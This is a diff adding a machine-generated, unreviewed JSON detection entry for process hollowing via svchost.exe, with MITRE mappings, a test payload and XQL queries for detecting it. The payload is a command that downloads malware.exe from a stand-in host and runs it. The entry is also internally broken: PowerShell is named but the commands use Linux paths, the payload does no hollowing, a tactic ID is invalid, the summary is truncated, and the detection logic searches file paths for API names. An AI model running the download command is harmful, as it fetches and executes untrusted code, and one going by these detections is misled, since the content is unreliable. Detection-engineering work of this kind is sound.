@@ -1,0 +1,151 @@
+{
+  "id": "TTP-0000-0009",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "source-not-recorded"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Process Hollowing via svchost.exe",
+    "summary": "An attacker creates a suspended svchost.exe process, replaces its memory with malicious code, and executes it under a trusted process name. Cortex should detect the parent-child image mismatch and inj",
+    "description": "An attacker creates a suspended svchost.exe process, replaces its memory with malicious code, and executes it under a trusted process name. Cortex should detect the parent-child image mismatch and injected thread."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1055",
+        "subtechnique_id": "T1055.012",
+        "name": "T1055.012",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      },
+      {
+        "technique_id": "T1106",
+        "name": "Native API",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "wget -O /tmp/malware.exe http://192.0.2.10/malware.exe\nstub chmod +x /tmp/malware.exe\nstub /tmp/malware.exe\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Parent process is svchost.exe",
+        "expected_value": "actor_process_image_name = 'svchost.exe'"
+      },
+      {
+        "artifact_type": "process",
+        "description": "Child process has mismatched image",
+        "expected_value": "action_process_image_name != 'svchost.exe'"
+      },
+      {
+        "artifact_type": "process",
+        "description": "Injected thread created in svchost.exe",
+        "expected_value": "action_process_image_name = 'svchost.exe' and action_file_path contains 'SetThreadContext'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Process Hollowing - Parent-Child Mismatch",
+        "description": "Detects when a process is created with a parent process image name that does not match the child's actual image.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'svchost.exe'\n| filter action_process_image_name != 'svchost.exe'\n| filter action_file_path contains 'VirtualAllocEx'\n| filter action_file_path contains 'WriteProcessMemory'\n| filter action_file_path contains 'SetThreadContext'",
+        "mitre_technique_ids": [
+          "T1055.012"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Process Hollowing Hunt Query",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'svchost.exe'\n| filter action_process_image_name != 'svchost.exe'\n| filter action_file_path contains 'VirtualAllocEx'\n| filter action_file_path contains 'WriteProcessMemory'\n| filter action_file_path contains 'SetThreadContext'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": []
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "MITRE ATT&CK T1055.012",
+      "url": "https://attack.mitre.org/techniques/T1055/012/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1106",
+      "url": "https://attack.mitre.org/techniques/T1106/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
